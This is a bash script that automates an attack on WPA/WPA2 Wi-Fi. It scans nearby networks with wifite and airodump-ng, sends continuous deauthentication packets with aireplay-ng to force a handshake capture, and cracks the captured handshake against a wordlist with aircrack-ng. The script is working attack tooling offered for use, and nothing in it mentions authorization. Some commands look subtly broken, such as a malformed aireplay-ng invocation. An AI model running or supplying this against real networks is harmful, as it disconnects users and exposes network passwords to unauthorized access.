#!/bin/bash

# Color definitions for messages
GREEN="\e[32m"   # Success/Positive outcomes
RED="\e[31m"     # Errors/Warnings
BLUE="\e[34m"    # Information/System calls
RESET="\e[0m"    # Reset color

# Log file setup
LOG_FILE="script.log"
echo "Log File: $LOG_FILE"
echo "Script run at: $(date)" > $LOG_FILE

# Function for logging and displaying messages
log_msg() {
    local level=$1
    local message=$2
    local color=$3
    echo -e "${color}[$level] $message${RESET}"
    echo "[$level] $message" >> $LOG_FILE
}

# Check for root permissions
if [[ $EUID -ne 0 ]]; then
    log_msg "!" "This script must be run as root. Exiting..." $RED
    exit 1
fi

# Verify necessary tools are installed
TOOLS=("wifite" "airodump-ng" "aireplay-ng" "aircrack-ng")
for tool in "${TOOLS[@]}"; do
    if ! command -v $tool &>/dev/null; then
        log_msg "!" "$tool is not installed. Please install it before running the script." $RED
        exit 1
    fi
done

# Create output directory
OUTPUT_DIR="captures"
mkdir -p $OUTPUT_DIR

# Initial Scan
log_msg "+" "Performing initial scan with Wifite..." $BLUE
sudo wifite -all
log_msg "+" "Initial scan complete." $GREEN

log_msg "+" "Scanning for nearby Wi-Fi networks..." $BLUE
sudo airodump-ng wlan0
log_msg "+" "Nearby Wi-Fi networks scanned." $GREEN

log_msg "+" "Scanning a specific channel and saving output to file..." $BLUE
read -p "Enter the channel number: " channel
if [[ ! $channel =~ ^[0-9]+$ ]]; then
    log_msg "!" "Invalid channel number. Please enter a valid number." $RED
    exit 1
fi
read -p "Enter the AP MAC address: " ap_mac
sudo airodump-ng -c $channel -w $OUTPUT_DIR/airdump.txt -d $ap_mac wlan0
log_msg "+" "Specific channel scan complete. Output saved to $OUTPUT_DIR/airdump.txt." $GREEN

# Wi-Fi Scan
log_msg "+" "Capturing a wider scan of nearby Wi-Fi networks..." $BLUE
sudo airodump-ng -w $OUTPUT_DIR/wider_scan_capture wlan0
log_msg "+" "Wider scan complete. Output saved to $OUTPUT_DIR/wider_scan_capture." $GREEN

log_msg "+" "Capturing a scan of a specific AP..." $BLUE
read -p "Enter the AP MAC address: " ap_mac
sudo airodump-ng -w $OUTPUT_DIR/ap_scan_capture wlan0 -d $ap_mac
log_msg "+" "AP-specific scan complete. Output saved to $OUTPUT_DIR/ap_scan_capture." $GREEN

# Deauthentication and Handshake Capture
log_msg "+" "Sending deauthentication packets to the target AP..." $BLUE
read -p "Enter the AP MAC address: " ap_mac
read -p "Enter the channel number: " channel
sudo aireplay-ng -0 0 -a $ap_mac -c wlan0
log_msg "+" "Deauthentication packets sent successfully." $GREEN

log_msg "+" "Capturing handshake packets..." $BLUE
sudo airodump-ng -w $OUTPUT_DIR/deauth_capture -c $channel -d $ap_mac wlan0
log_msg "+" "Handshake capture complete. Output saved to $OUTPUT_DIR/deauth_capture." $GREEN

# Password Cracking
log_msg "+" "Cracking the WPA/WPA2 password..." $BLUE
read -p "Enter the path to the wordlist file: " wordlist
if [[ ! -f $wordlist ]]; then
    log_msg "!" "Wordlist file not found. Exiting..." $RED
    exit 1
fi
sudo aircrack-ng $OUTPUT_DIR/deauth_capture-01.cap -w $wordlist
if [[ $? -eq 0 ]]; then
    log_msg "+" "Password cracking complete. Check output for details." $GREEN
else
    log_msg "!" "Password cracking failed. Check log for details." $RED
fi

# Additional Information
log_msg "+" "To analyze the captured packets, use Wireshark with the following filter: eapol" $BLUE
log_msg "+" "Script completed. All logs saved to $LOG_FILE." $GREEN
